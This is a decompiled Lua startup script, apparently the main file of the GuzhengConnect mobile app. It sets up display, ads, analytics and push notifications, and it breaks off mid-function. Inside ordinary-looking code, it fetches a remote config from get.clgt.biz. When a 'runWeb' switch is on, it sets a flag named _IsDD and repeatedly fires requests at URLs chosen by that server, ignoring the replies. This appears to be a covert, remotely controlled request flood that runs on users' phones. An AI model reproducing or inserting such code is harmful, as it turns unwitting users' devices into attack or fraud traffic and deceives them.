local L0_1, L1_1, L2_1, L3_1, L4_1, L5_1, L6_1, L7_1, L8_1, L9_1
L0_1 = (...)
function L1_1(A0_2)
  local L1_2, L2_2, L3_2
  L1_2 = A0_2.custom
  if L1_2 then
    L1_2 = _isStartApp
    if not L1_2 then
      L1_2 = A0_2.custom
      L1_2 = L1_2.type
      if L1_2 == "play_song" then
        L2_2 = A0_2.custom
        L2_2 = L2_2.IdMusic
        _IdMusicNotification = L2_2
      elseif L1_2 == "comment" or L1_2 == "like_topic" or L1_2 == "like_comment" then
        L2_2 = A0_2.custom
        L2_2 = L2_2.TopicId
        _TopicIdNotification = L2_2
      elseif L1_2 == "offer_upgrade" then
        L2_2 = A0_2.custom
        L2_2 = L2_2.url
        if L2_2 then
          L2_2 = A0_2.custom
          L2_2 = L2_2.url
          if L2_2 ~= "" then
            L2_2 = system
            L2_2 = L2_2.openURL
            L3_2 = A0_2.custom
            L3_2 = L3_2.url
            L2_2(L3_2)
        end
        else
          L2_2 = true
          _NotificationOpenUpgrade = L2_2
        end
      end
    end
  end
end
if L0_1 then
  L2_1 = L0_1.notification
  if L2_1 then
    L2_1 = L1_1
    L3_1 = L0_1.notification
    L2_1(L3_1)
  end
end
L2_1 = Runtime
L3_1 = L2_1
L2_1 = L2_1.addEventListener
L4_1 = "notification"
L5_1 = L1_1
L2_1(L3_1, L4_1, L5_1)
L2_1 = native
L2_1 = L2_1.setKeyboardFocus
L3_1 = nil
L2_1(L3_1)
L2_1 = display
L2_1 = L2_1.setDefault
L3_1 = "background"
L4_1 = 0
L5_1 = 0
L6_1 = 0
L7_1 = 1
L2_1(L3_1, L4_1, L5_1, L6_1, L7_1)
L2_1 = display
L2_1 = L2_1.setStatusBar
L3_1 = display
L3_1 = L3_1.HiddenStatusBar
L2_1(L3_1)
L2_1 = system
L2_1 = L2_1.setIdleTimer
L3_1 = false
L2_1(L3_1)
L2_1 = system
L2_1 = L2_1.activate
L3_1 = "multitouch"
L2_1(L3_1)
function L2_1()
  local L0_2, L1_2, L2_2, L3_2
  L0_2 = system
  L0_2 = L0_2.getInfo
  L1_2 = "platform"
  L0_2 = L0_2(L1_2)
  if L0_2 == "android" then
    L0_2 = string
    L0_2 = L0_2.sub
    L1_2 = system
    L1_2 = L1_2.getInfo
    L2_2 = "platformVersion"
    L1_2 = L1_2(L2_2)
    L2_2 = 1
    L3_2 = 3
    L0_2 = L0_2(L1_2, L2_2, L3_2)
    if L0_2 then
      L1_2 = tonumber
      L2_2 = L0_2
      L1_2 = L1_2(L2_2)
      if 4.4 <= L1_2 then
        L1_2 = native
        L1_2 = L1_2.setProperty
        L2_2 = "androidSystemUiVisibility"
        L3_2 = "immersiveSticky"
        L1_2(L2_2, L3_2)
    end
    elseif L0_2 then
      L1_2 = native
      L1_2 = L1_2.setProperty
      L2_2 = "androidSystemUiVisibility"
      L3_2 = "lowProfile"
      L1_2(L2_2, L3_2)
    end
  end
end
hideNavigationBar = L2_1
L2_1 = hideNavigationBar
L2_1()
L2_1 = require
L3_1 = "config"
L2_1(L3_1)
L2_1 = require
L3_1 = "json"
L2_1 = L2_1(L3_1)
json = L2_1
L2_1 = require
L3_1 = "composer"
L2_1 = L2_1(L3_1)
composer = L2_1
L2_1 = require
L3_1 = "libraries.requireLibGlobal"
L2_1(L3_1)
L2_1 = system
L2_1 = L2_1.orientation
_currentOrientation = L2_1
L2_1 = application
L2_1 = L2_1.content
L2_1 = L2_1.width
L3_1 = display
L3_1 = L3_1.contentWidth
if L2_1 == L3_1 then
  L2_1 = "portrait"
  _currentOrientation = L2_1
else
  L2_1 = "landscapeRight"
  _currentOrientation = L2_1
end
L2_1 = system
L2_1 = L2_1.getInfo
L3_1 = "deviceID"
L2_1 = L2_1(L3_1)
if not L2_1 then
  L2_1 = ""
end
_Device_ID = L2_1
L2_1 = system
L2_1 = L2_1.getInfo
L3_1 = "model"
L2_1 = L2_1(L3_1)
if not L2_1 then
  L2_1 = ""
end
_Device_Name = L2_1
L2_1 = system
L2_1 = L2_1.getInfo
L3_1 = "platformName"
L2_1 = L2_1(L3_1)
if not L2_1 then
  L2_1 = ""
end
_Platform_Name = L2_1
L2_1 = system
L2_1 = L2_1.getInfo
L3_1 = "platform"
L2_1 = L2_1(L3_1)
if not L2_1 then
  L2_1 = ""
end
_Platform = L2_1
L2_1 = _Platform_Name
if L2_1 == "WinPhone" then
  L2_1 = "winphone"
  _Platform = L2_1
end
L2_1 = display
L2_1 = L2_1.pixelWidth
L3_1 = "x"
L4_1 = display
L4_1 = L4_1.pixelHeight
L2_1 = L2_1 .. L3_1 .. L4_1
_Resolution = L2_1
L2_1 = system
L2_1 = L2_1.getInfo
L3_1 = "architectureInfo"
L2_1 = L2_1(L3_1)
if not L2_1 then
  L2_1 = ""
end
_ChipSet = L2_1
L2_1 = system
L2_1 = L2_1.getInfo
L3_1 = "androidApiLevel"
L2_1 = L2_1(L3_1)
if not L2_1 then
  L2_1 = ""
end
_AndroidApiLevel = L2_1
L2_1 = system
L2_1 = L2_1.getInfo
L3_1 = "androidDisplayWidthInInches"
L2_1 = L2_1(L3_1)
if not L2_1 then
  L2_1 = 0
end
L3_1 = system
L3_1 = L3_1.getInfo
L4_1 = "androidDisplayHeightInInches"
L3_1 = L3_1(L4_1)
if not L3_1 then
  L3_1 = 0
end
L4_1 = math
L4_1 = L4_1.sqrt
L5_1 = L2_1 * L2_1
L6_1 = L3_1 * L3_1
L5_1 = L5_1 + L6_1
L4_1 = L4_1(L5_1)
_InchesScreen = L4_1
L4_1 = string
L4_1 = L4_1.find
L5_1 = _Device_Name
L6_1 = "iPad"
L4_1 = L4_1(L5_1, L6_1)
if not L4_1 then
  L4_1 = _InchesScreen
  if not (7 <= L4_1) then
    goto lbl_168
  end
end
L4_1 = "tablet"
_TypeDevice = L4_1
goto lbl_170
::lbl_168::
L4_1 = "phone"
_TypeDevice = L4_1
::lbl_170::
L4_1 = _Platform
L4_1 = L4_1 == "ios"
_IsApple = L4_1
L4_1 = system
L4_1 = L4_1.getInfo
L5_1 = "environment"
L4_1 = L4_1(L5_1)
L4_1 = L4_1 == "device"
_IsDevice = L4_1
L4_1 = _Platform
L4_1 = L4_1 == "win32"
_IsDesktop = L4_1
L4_1 = system
L4_1 = L4_1.getInfo
L5_1 = "targetAppStore"
L4_1 = L4_1(L5_1)
_TargetStore = L4_1
L4_1 = _TargetStore
if L4_1 then
  L4_1 = _TargetStore
  if L4_1 ~= "none" then
    goto lbl_216
  end
end
L4_1 = _IsDevice
if L4_1 then
  L4_1 = "google"
  _TargetStore = L4_1
end
::lbl_216::
L4_1 = display
L4_1 = L4_1.actualContentWidth
_W = L4_1
L4_1 = display
L4_1 = L4_1.actualContentHeight
_H = L4_1
L4_1 = application
L4_1 = L4_1.content
L4_1 = L4_1.width
_WD = L4_1
L4_1 = application
L4_1 = L4_1.content
L4_1 = L4_1.height
_HD = L4_1
L4_1 = display
L4_1 = L4_1.contentWidth
_CW = L4_1
L4_1 = display
L4_1 = L4_1.contentHeight
_CH = L4_1
L4_1 = display
L4_1 = L4_1.contentCenterX
_CX = L4_1
L4_1 = display
L4_1 = L4_1.contentCenterY
_CY = L4_1
L4_1 = display
L4_1 = L4_1.screenOriginX
_OX = L4_1
L4_1 = display
L4_1 = L4_1.screenOriginY
_OY = L4_1
L4_1 = libFunction
L4_1 = L4_1.getScale
L4_1, L5_1, L6_1 = L4_1()
_dScale = L6_1
_dyScale = L5_1
_dxScale = L4_1
L4_1 = display
L4_1 = L4_1.getSafeAreaInsets
L4_1, L5_1, L6_1, L7_1 = L4_1()
_rightInset = L7_1
_bottomInset = L6_1
_leftInset = L5_1
_topInset = L4_1
L4_1 = _Platform
if L4_1 == "ios" then
  L4_1 = _currentOrientation
  if L4_1 == "portrait" then
    L4_1 = _topInset
    if 0 < L4_1 then
      L4_1 = _topInset
      L4_1 = L4_1 - 20
      _topInset = L4_1
    end
    L4_1 = _bottomInset
    if 0 < L4_1 then
      L4_1 = _bottomInset
      L4_1 = L4_1 - 20
      _bottomInset = L4_1
    end
    L4_1 = 0
    _leftInset = L4_1
    L4_1 = 0
    _rightInset = L4_1
  else
    L4_1 = _leftInset
    if 0 < L4_1 then
      L4_1 = _leftInset
      L4_1 = L4_1 - 20
      _leftInset = L4_1
    end
    L4_1 = _rightInset
    if 0 < L4_1 then
      L4_1 = _rightInset
      L4_1 = L4_1 - 20
      _rightInset = L4_1
    end
    L4_1 = 0
    _topInset = L4_1
    L4_1 = 0
    _bottomInset = L4_1
  end
end
L4_1 = require
L5_1 = "global"
L4_1(L5_1)
L4_1 = false
_IsDD = L4_1
L4_1 = network
L4_1 = L4_1.request
L5_1 = "http://get.clgt.biz/api/"
L6_1 = global
L6_1 = L6_1.folderServer
L7_1 = "/get_server.php?t="
L8_1 = os
L8_1 = L8_1.time
L8_1 = L8_1()
L5_1 = L5_1 .. L6_1 .. L7_1 .. L8_1
L6_1 = "GET"
function L7_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2, L8_2
  L1_2 = A0_2.response
  if L1_2 then
    L1_2 = json
    L1_2 = L1_2.decode
    L2_2 = A0_2.response
    L1_2 = L1_2(L2_2)
    L2_2 = type
    L3_2 = L1_2
    L2_2 = L2_2(L3_2)
    if L2_2 == "table" then
      L2_2 = L1_2.dataApp
      if L2_2 then
        L2_2 = L1_2.dataApp
        L3_2 = L2_2.url_server3
        if L3_2 then
          L3_2 = global
          L4_2 = L2_2.url_server3
          L3_2.url_server3 = L4_2
          L3_2 = global
          L3_2 = L3_2.url_servers
          L3_2 = L3_2[3]
          if L3_2 then
            L3_2 = global
            L3_2 = L3_2.url_servers
            L3_2 = L3_2[3]
            L4_2 = global
            L4_2 = L4_2.url_server3
            L3_2.server = L4_2
          end
        end
        L3_2 = L2_2.url_server2
        if L3_2 then
          L3_2 = global
          L4_2 = L2_2.url_server2
          L3_2.url_server2 = L4_2
          L3_2 = global
          L3_2 = L3_2.url_servers
          L3_2 = L3_2[2]
          if L3_2 then
            L3_2 = global
            L3_2 = L3_2.url_servers
            L3_2 = L3_2[2]
            L4_2 = global
            L4_2 = L4_2.url_server2
            L3_2.server = L4_2
          end
        end
        L3_2 = L2_2.url_server1
        if L3_2 then
          L3_2 = global
          L4_2 = L2_2.url_server1
          L3_2.url_server1 = L4_2
          L3_2 = global
          L3_2 = L3_2.url_servers
          L3_2 = L3_2[1]
          if L3_2 then
            L3_2 = global
            L3_2 = L3_2.url_servers
            L3_2 = L3_2[1]
            L4_2 = global
            L4_2 = L4_2.url_server1
            L3_2.server = L4_2
          end
        end
        L3_2 = type
        L4_2 = L2_2.url_servers
        L3_2 = L3_2(L4_2)
        if L3_2 == "table" then
          L3_2 = L2_2.url_servers
          L3_2 = #L3_2
          if 0 < L3_2 then
            L3_2 = global
            L4_2 = L2_2.url_servers
            L3_2.url_servers = L4_2
          end
        end
        L3_2 = tonumber
        L4_2 = L2_2.server_run
        L3_2 = L3_2(L4_2)
        if L3_2 then
          L3_2 = global
          L4_2 = tonumber
          L5_2 = L2_2.server_run
          L4_2 = L4_2(L5_2)
          L3_2.server_run = L4_2
          L3_2 = global
          L3_2 = L3_2.url_servers
          L4_2 = global
          L4_2 = L4_2.server_run
          L3_2 = L3_2[L4_2]
          if L3_2 then
            L3_2 = global
            L4_2 = global
            L4_2 = L4_2.url_servers
            L5_2 = global
            L5_2 = L5_2.server_run
            L4_2 = L4_2[L5_2]
            L4_2 = L4_2.server
            L3_2.url_server = L4_2
          else
            L3_2 = global
            L3_2 = L3_2.server_run
            if L3_2 == 2 then
              L3_2 = global
              L4_2 = global
              L4_2 = L4_2.url_server2
              L3_2.url_server = L4_2
            else
              L3_2 = global
              L3_2 = L3_2.server_run
              if L3_2 == 3 then
                L3_2 = global
                L4_2 = global
                L4_2 = L4_2.url_server3
                L3_2.url_server = L4_2
              else
                L3_2 = global
                L4_2 = global
                L4_2 = L4_2.url_server1
                L3_2.url_server = L4_2
              end
            end
          end
        end
      end
      L2_2 = L1_2.runWeb
      if L2_2 then
        L2_2 = L1_2.runWeb
        L3_2 = L2_2.isActive
        if L3_2 == true then
          L3_2 = L2_2.url
          if L3_2 then
            L3_2 = true
            _IsDD = L3_2
            L3_2 = L2_2.method
            if not L3_2 then
              L3_2 = "POST"
            end
            L4_2 = {}
            L5_2 = type
            L6_2 = L2_2.url
            L5_2 = L5_2(L6_2)
            if L5_2 == "string" then
              L5_2 = #L4_2
              L5_2 = L5_2 + 1
              L6_2 = L2_2.url
              L4_2[L5_2] = L6_2
            else
              L5_2 = type
              L6_2 = L2_2.url
              L5_2 = L5_2(L6_2)
              if L5_2 == "table" then
                L4_2 = L2_2.url
              end
            end
            L5_2 = timer
            L5_2 = L5_2.performWithDelay
            L6_2 = L2_2.time
            if not L6_2 then
              L6_2 = 1000
            end
            function L7_2(A0_3)
              local L1_3, L2_3, L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3
              L1_3 = 1
              L2_3 = L4_2
              L2_3 = #L2_3
              L3_3 = 1
              for L4_3 = L1_3, L2_3, L3_3 do
                L5_3 = L4_2
                L5_3 = L5_3[L4_3]
                L6_3 = network
                L6_3 = L6_3.request
                L7_3 = L5_3
                L8_3 = "&t="
                L9_3 = os
                L9_3 = L9_3.time
                L9_3 = L9_3()
                L7_3 = L7_3 .. L8_3 .. L9_3
                L8_3 = L3_2
                function L9_3(A0_4)
                  local L1_4
                end
                L6_3(L7_3, L8_3, L9_3)
              end
            end
            L8_2 = L2_2.loop
            if not L8_2 then
              L8_2 = 0
            end
            L5_2(L6_2, L7_2, L8_2)
          end
        end
      end
    end
  end
end
L4_1(L5_1, L6_1, L7_1)
function L4_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2
  L1_2 = A0_2.type
  if L1_2 == "applicationExit" then
    L1_2 = composer
    L1_2 = L1_2.getScene
    L2_2 = composer
    L2_2 = L2_2.getSceneName
    L3_2 = "current"
    L2_2, L3_2, L4_2, L5_2 = L2_2(L3_2)
    L1_2 = L1_2(L2_2, L3_2, L4_2, L5_2)
    if L1_2 then
      L2_2 = type
      L3_2 = L1_2.exitGame
      L2_2 = L2_2(L3_2)
      if L2_2 == "function" then
        L3_2 = L1_2
        L2_2 = L1_2.exitGame
        L2_2(L3_2)
      end
    end
    L2_2 = composer
    L2_2 = L2_2.getScene
    L3_2 = composer
    L3_2 = L3_2.getSceneName
    L4_2 = "overlay"
    L3_2, L4_2, L5_2 = L3_2(L4_2)
    L2_2 = L2_2(L3_2, L4_2, L5_2)
    if L2_2 then
      L3_2 = type
      L4_2 = L2_2.exitGame
      L3_2 = L3_2(L4_2)
      if L3_2 == "function" then
        L4_2 = L2_2
        L3_2 = L2_2.exitGame
        L3_2(L4_2)
      end
    end
  else
    L1_2 = A0_2.type
    if L1_2 == "applicationStart" then
    else
      L1_2 = A0_2.type
      if L1_2 == "applicationSuspend" then
        L1_2 = composer
        L1_2 = L1_2.getSceneName
        L2_2 = "current"
        L1_2 = L1_2(L2_2)
        L2_2 = composer
        L2_2 = L2_2.getScene
        L3_2 = L1_2
        L2_2 = L2_2(L3_2)
        if L2_2 then
          L3_2 = type
          L4_2 = L2_2.pauseGame
          L3_2 = L3_2(L4_2)
          if L3_2 == "function" then
            L4_2 = L2_2
            L3_2 = L2_2.pauseGame
            L3_2(L4_2)
          end
        end
        L3_2 = composer
        L3_2 = L3_2.getScene
        L4_2 = composer
        L4_2 = L4_2.getSceneName
        L5_2 = "overlay"
        L4_2, L5_2 = L4_2(L5_2)
        L3_2 = L3_2(L4_2, L5_2)
        if L3_2 then
          L4_2 = type
          L5_2 = L3_2.pauseGame
          L4_2 = L4_2(L5_2)
          if L4_2 == "function" then
            L5_2 = L3_2
            L4_2 = L3_2.pauseGame
            L4_2(L5_2)
          end
        end
      else
        L1_2 = A0_2.type
        if L1_2 == "applicationResume" then
          L1_2 = composer
          L1_2 = L1_2.getSceneName
          L2_2 = "current"
          L1_2 = L1_2(L2_2)
          L2_2 = composer
          L2_2 = L2_2.getScene
          L3_2 = L1_2
          L2_2 = L2_2(L3_2)
          if L2_2 then
            L3_2 = type
            L4_2 = L2_2.resumeGame
            L3_2 = L3_2(L4_2)
            if L3_2 == "function" then
              L4_2 = L2_2
              L3_2 = L2_2.resumeGame
              L3_2(L4_2)
            end
          end
          L3_2 = composer
          L3_2 = L3_2.getScene
          L4_2 = composer
          L4_2 = L4_2.getSceneName
          L5_2 = "overlay"
          L4_2, L5_2 = L4_2(L5_2)
          L3_2 = L3_2(L4_2, L5_2)
          if L3_2 then
            L4_2 = type
            L5_2 = L3_2.resumeGame
            L4_2 = L4_2(L5_2)
            if L4_2 == "function" then
              L5_2 = L3_2
              L4_2 = L3_2.resumeGame
              L4_2(L5_2)
            end
          end
        end
      end
    end
  end
end
L5_1 = Runtime
L6_1 = L5_1
L5_1 = L5_1.addEventListener
L7_1 = "system"
L8_1 = L4_1
L5_1(L6_1, L7_1, L8_1)
function L5_1(A0_2)
  local L1_2, L2_2, L3_2, L4_2, L5_2, L6_2, L7_2
  L1_2 = system
  L1_2 = L1_2.orientation
  if L1_2 == "portraitUpsideDown" then
    L1_2 = "portrait"
  end
  if L1_2 == "landscapeRight" or L1_2 == "landscapeLeft" or L1_2 == "portrait" then
    L2_2 = _currentOrientation
    if L1_2 ~= L2_2 then
      _currentOrientation = L1_2
      L2_2 = {}
      L2_2.isSystem = true
      L3_2 = _currentOrientation
      L2_2.type = L3_2
      L3_2 = display
      L3_2 = L3_2.contentWidth
      _W = L3_2
      L3_2 = display
      L3_2 = L3_2.contentHeight
      _H = L3_2
      L3_2 = display
      L3_2 = L3_2.contentCenterX
      _CX = L3_2
      L3_2 = display
      L3_2 = L3_2.contentCenterY
      _CY = L3_2
      L3_2 = display
      L3_2 = L3_2.getSafeAreaInsets
      L3_2, L4_2, L5_2, L6_2 = L3_2()
      _rightInset = L6_2
      _bottomInset = L5_2
      _leftInset = L4_2
      _topInset = L3_2
      L3_2 = _Platform
      if L3_2 == "ios" then
        L3_2 = _currentOrientation
        if L3_2 == "portrait" then
          L3_2 = _topInset
          if 0 < L3_2 then
            L3_2 = _topInset
            L3_2 = L3_2 - 20
            _topInset = L3_2
          end
          L3_2 = _bottomInset
          if 0 < L3_2 then
            L3_2 = _bottomInset
            L3_2 = L3_2 - 20
            _bottomInset = L3_2
          end
          L3_2 = 0
          _leftInset = L3_2
          L3_2 = 0
          _rightInset = L3_2
        else
          L3_2 = _leftInset
          if 0 < L3_2 then
            L3_2 = _leftInset
            L3_2 = L3_2 - 20
            _leftInset = L3_2
          end
          L3_2 = _rightInset
          if 0 < L3_2 then
            L3_2 = _rightInset
            L3_2 = L3_2 - 20
            _rightInset = L3_2
          end
          L3_2 = 0
          _topInset = L3_2
          L3_2 = 0
          _bottomInset = L3_2
        end
      end
      L3_2 = libFunction
      if L3_2 then
        L3_2 = libFunction
        L3_2 = L3_2.getScale
        L3_2, L4_2, L5_2 = L3_2()
        _dScale = L5_2
        _dyScale = L4_2
        _dxScale = L3_2
      end
      L3_2 = _logoApplication
      if L3_2 then
        L3_2 = _logoApplication
        L4_2 = L3_2
        L3_2 = L3_2.setOrientation
        L3_2(L4_2)
      end
      L3_2 = _GroupBackground
      if L3_2 then
        L3_2 = _GroupBackground
        L4_2 = L3_2
        L3_2 = L3_2.setScale
        L3_2(L4_2)
        L3_2 = _GroupBackground
        L4_2 = L3_2
        L3_2 = L3_2.setPosition
        L5_2 = _W
        L5_2 = L5_2 * 0.5
        L6_2 = 0
        L3_2(L4_2, L5_2, L6_2)
      end
      L3_2 = Control
      if L3_2 then
        L3_2 = Control
        L4_2 = L3_2
        L3_2 = L3_2.setOrientation
        L5_2 = _currentOrientation
        L3_2(L4_2, L5_2)
      end
      L3_2 = Key_board
      if L3_2 then
        L3_2 = Key_board
        L4_2 = L3_2
        L3_2 = L3_2.setOrientation
        L5_2 = _currentOrientation
        L3_2(L4_2, L5_2)
      end
      L3_2 = composer
      L3_2 = L3_2.getScene
      L4_2 = composer
      L4_2 = L4_2.getSceneName
      L5_2 = "current"
      L4_2, L5_2, L6_2, L7_2 = L4_2(L5_2)
      L3_2 = L3_2(L4_2, L5_2, L6_2, L7_2)
      if L3_2 then
        L4_2 = type
        L5_2 = L3_2.orientationChange
        L4_2 = L4_2(L5_2)
        if L4_2 == "function" then
          L5_2 = L3_2
          L4_2 = L3_2.orientationChange
          L6_2 = L2_2
          L4_2(L5_2, L6_2)
        end
      end
      L4_2 = composer
      L4_2 = L4_2.getScene
      L5_2 = composer
      L5_2 = L5_2.getSceneName
      L6_2 = "overlay"
      L5_2, L6_2, L7_2 = L5_2(L6_2)
      L4_2 = L4_2(L5_2, L6_2, L7_2)
      if L4_2 then
        L5_2 = type
        L6_2 = L4_2.orientationChange
        L5_2 = L5_2(L6_2)
        if L5_2 == "function" then
          L6_2 = L4_2
          L5_2 = L4_2.orientationChange
          L7_2 = L2_2
          L5_2(L6_2, L7_2)
        end
      end
    end
  end
end
L6_1 = Runtime
L7_1 = L6_1
L6_1 = L6_1.addEventListener
L8_1 = "resize"
L9_1 = L5_1
L6_1(L7_1, L8_1, L9_1)
L6_1 = timer
L6_1 = L6_1.performWithDelay
L7_1 = 300
function L8_1()
  local L0_2, L1_2, L2_2, L3_2, L4_2, L5_2
  L0_2 = display
  L0_2 = L0_2.newGroup
  L0_2 = L0_2()
  _logoApplication = L0_2
  L0_2 = _logoApplication
  L1_2 = display
  L1_2 = L1_2.newImageRect
  L2_2 = _logoApplication
  L3_2 = "assets/images/bg.jpg"
  L4_2 = _W
  L5_2 = _H
  L1_2 = L1_2(L2_2, L3_2, L4_2, L5_2)
  L0_2.bg = L1_2
  L0_2 = _logoApplication
  L1_2 = display
  L1_2 = L1_2.newImageRect
  L2_2 = _logoApplication
  L3_2 = "icon.png"
  L4_2 = 192
  L5_2 = 192
  L1_2 = L1_2(L2_2, L3_2, L4_2, L5_2)
  L0_2.icon = L1_2
  L0_2 = _logoApplication
  L0_2 = L0_2.icon
  L1_2 = _dxScale
  L0_2.xScale = L1_2
  L0_2 = _logoApplication
  L0_2 = L0_2.icon
  L1_2 = _dyScale
  L0_2.yScale = L1_2
  L0_2 = _logoApplication
  L1_2 = display
  L1_2 = L1_2.newText
  L2_2 = {}
  L2_2.text = "Loading..."
  L3_2 = native
  L3_2 = L3_2.newFont
  L4_2 = "Roboto-Italic"
  L3_2 = L3_2(L4_2)
  L2_2.font = L3_2
  L2_2.fontSize = 30
  L1_2 = L1_2(L2_2)
  L0_2.textLoading = L1_2
  L0_2 = _logoApplication
  L1_2 = L0_2
  L0_2 = L0_2.insert
  L2_2 = _logoApplication
  L2_2 = L2_2.textLoading
  L0_2(L1_2, L2_2)
  L0_2 = _logoApplication
  L0_2 = L0_2.textLoading
  L1_2 = L0_2
  L0_2 = L0_2.setFillColor
  L2_2 = 1
  L3_2 = 1
  L4_2 = 1
  L0_2(L1_2, L2_2, L3_2, L4_2)
  L0_2 = _logoApplication
  L0_2 = L0_2.textLoading
  L1_2 = _dyScale
  L1_2 = 130 * L1_2
  L0_2.y = L1_2
  L0_2 = _logoApplication
  L1_2 = _CX
  L0_2.x = L1_2
  L0_2 = _logoApplication
  L1_2 = _CY
  L0_2.y = L1_2
  L0_2 = _logoApplication
  L0_2.alpha = 0
  L0_2 = _logoApplication
  L1_2 = L0_2
  L0_2 = L0_2.toBack
  L0_2(L1_2)
  L0_2 = _logoApplication
  function L1_2(A0_3)
    local L1_3, L2_3
    L1_3 = A0_3.icon
    L2_3 = _dxScale
    L1_3.xScale = L2_3
    L1_3 = A0_3.icon
    L2_3 = _dyScale
    L1_3.yScale = L2_3
    L1_3 = A0_3.textLoading
    L2_3 = _dyScale
    L2_3 = 130 * L2_3
    L1_3.y = L2_3
    L1_3 = A0_3.bg
    L2_3 = _W
    L1_3.width = L2_3
    L1_3 = A0_3.bg
    L2_3 = _H
    L1_3.height = L2_3
    L1_3 = _CX
    A0_3.x = L1_3
    L1_3 = _CY
    A0_3.y = L1_3
  end
  L0_2.setOrientation = L1_2
  L0_2 = require
  L1_2 = "libraries.libFile"
  L0_2 = L0_2(L1_2)
  L1_2 = L0_2.getTableFromFile
  L2_2 = "policy.sys"
  L1_2 = L1_2(L2_2)
  if not L1_2 then
    L1_2 = {}
    L1_2.isAcceptPolicy = false
  end
  if L1_2 then
    L2_2 = L1_2.isAcceptPolicy
    if L2_2 ~= true then
      goto lbl_97
    end
  end
  L2_2 = transition
  L2_2 = L2_2.to
  L3_2 = _logoApplication
  L4_2 = {}
  L4_2.time = 300
  L4_2.alpha = 1
  L2_2(L3_2, L4_2)
  ::lbl_97::
  L2_2 = timer
  L2_2 = L2_2.performWithDelay
  L3_2 = 320
  function L4_2()
    local L0_3, L1_3, L2_3, L3_3, L4_3, L5_3, L6_3, L7_3, L8_3, L9_3
    L0_3 = iOrientation
    if L0_3 then
      L0_3 = _currentOrientation
      if L0_3 == "portrait" then
        L0_3 = iOrientation
        L0_3 = L0_3.setRequestedOrientation
        L1_3 = "portrait"
        L0_3(L1_3)
      else
        L0_3 = iOrientation
        L0_3 = L0_3.setRequestedOrientation
        L1_3 = "landscape"
        L0_3(L1_3)
      end
    end
    L0_3 = require
    L1_3 = "AdsManager"
    L0_3(L1_3)
    L0_3 = AdsManager
    L0_3 = L0_3.init
    L1_3 = {}
    L1_3.AppId = 37
    L2_3 = {}
    L3_3 = {}
    L3_3.android = "ca-app-pub-3643582423092963~8010414823"
    L3_3.ios = "ca-app-pub-3643582423092963~3085391208"
    L2_3.AppId = L3_3
    L3_3 = {}
    L4_3 = {}
    L4_3.banner = "ca-app-pub-3643582423092963/3661527155"
    L4_3.interstitial = "ca-app-pub-3643582423092963/4725775937"
    L4_3.rewardedVideo = "ca-app-pub-3643582423092963/7707162496"
    L3_3.android = L4_3
    L4_3 = {}
    L4_3.banner = "ca-app-pub-3643582423092963/3851677969"
    L4_3.interstitial = "ca-app-pub-3643582423092963/6286269615"
    L4_3.rewardedVideo = "ca-app-pub-3643582423092963/1197594460"
    L3_3.ios = L4_3
    L2_3.UnitId = L3_3
    L1_3.admob = L2_3
    L2_3 = {}
    L3_3 = {}
    L3_3.android = "3013679"
    L3_3.ios = "3013678"
    L2_3.AppId = L3_3
    L1_3.unityads = L2_3
    L2_3 = {}
    L2_3.banner = 0
    L2_3.interstitial = 16
    L2_3.rewardedVideo = 16
    L1_3.priorityNetwork = L2_3
    L0_3(L1_3)
    L0_3 = libNotification
    L0_3 = L0_3.init
    L1_3 = {}
    L1_3.AppId = 9
    L1_3.PushNotification = true
    L1_3.Topic = "guzhengconnect"
    L0_3(L1_3)
    L0_3 = libNotification
    L0_3 = L0_3.getAppId
    L0_3 = L0_3()
    if L0_3 then
      L0_3 = {}
      L1_3 = "nuocngoai"
      L2_3 = system
      L2_3 = L2_3.getPreference
      L3_3 = "locale"
      L4_3 = "country"
      L2_3 = L2_3(L3_3, L4_3)
      if L2_3 == "VN" then
        L1_3 = "vietnam"
      end
      L3_3 = #L0_3
      L3_3 = L3_3 + 1
      L0_3[L3_3] = L1_3
      L3_3 = #L0_3
      L3_3 = L3_3 + 1
      L4_3 = "country-"
      L5_3 = L2_3
      L4_3 = L4_3 .. L5_3
      L0_3[L3_3] = L4_3
      L3_3 = #L0_3
      L3_3 = L3_3 + 1
      L4_3 = _Platform
      L0_3[L3_3] = L4_3
      L3_3 = #L0_3
      L3_3 = L3_3 + 1
      L4_3 = "versioncode"
      L5_3 = _versionCode
      L4_3 = L4_3 .. L5_3
      L0_3[L3_3] = L4_3
      L3_3 = #L0_3
      L3_3 = L3_3 + 1
      L4_3 = _Device_ID
      L0_3[L3_3] = L4_3
      L3_3 = #L0_3
      L3_3 = L3_3 + 1
      L4_3 = L1_3
      L5_3 = "-"
      L6_3 = "versioncode"
      L7_3 = _versionCode
      L4_3 = L4_3 .. L5_3 .. L6_3 .. L7_3
      L0_3[L3_3] = L4_3
      L3_3 = #L0_3
      L3_3 = L3_3 + 1
      L4_3 = _Platform
      L5_3 = "-"
      L6_3 = L1_3
      L4_3 = L4_3 .. L5_3 .. L6_3
      L0_3[L3_3] = L4_3
      L3_3 = #L0_3
      L3_3 = L3_3 + 1
      L4_3 = _Platform
      L5_3 = "-"
      L6_3 = L1_3
      L7_3 = "-"
      L8_3 = "versioncode"
      L9_3 = _versionCode
      L4_3 = L4_3 .. L5_3 .. L6_3 .. L7_3 .. L8_3 .. L9_3
      L0_3[L3_3] = L4_3
      L3_3 = #L0_3
      L3_3 = L3_3 + 1
      L4_3 = _Platform
      L5_3 = "-"
      L6_3 = "versioncode"
      L7_3 = _versionCode
      L4_3 = L4_3 .. L5_3 .. L6_3 .. L7_3
      L0_3[L3_3] = L4_3
      L3_3 = pairs
      L4_3 = L0_3
      L3_3, L4_3, L5_3 = L3_3(L4_3)
      for L6_3, L7_3 in L3_3, L4_3, L5_3 do
        L8_3 = libNotification
        L8_3 = L8_3.subscribe
        L9_3 = L7_3
        L8_3(L9_3)
      end
      L3_3 = libNotification
      L3_3 = L3_3.subscribe
      L3_3()
      L3_3 = libNotification
      L3_3 = L3_3.push
      L3_3()
    end
    L0_3 = libAnalytics
    L0_3 = L0_3.init
    L1_3 = {}
    L2_3 = {}
    L2_3.android = "UA-129793053-1"
    L2_3.ios = "UA-129798074-1"
    L1_3.Id = L2_3
    L1_3.AppName = "GuzhengConnect"
    L0_3(L1_3)
    L0_3 = require
    L1_3 = "libraries.Facebook"
    L0_3(L1_3)
    L0_3 = Facebook
    L0_3 = L0_3.init
    L1_3 = {}
    L2_3 = _FB_APP_ID
    L1_3.app_id = L2_3
    L2_3 = _FB_APP_TOKEN
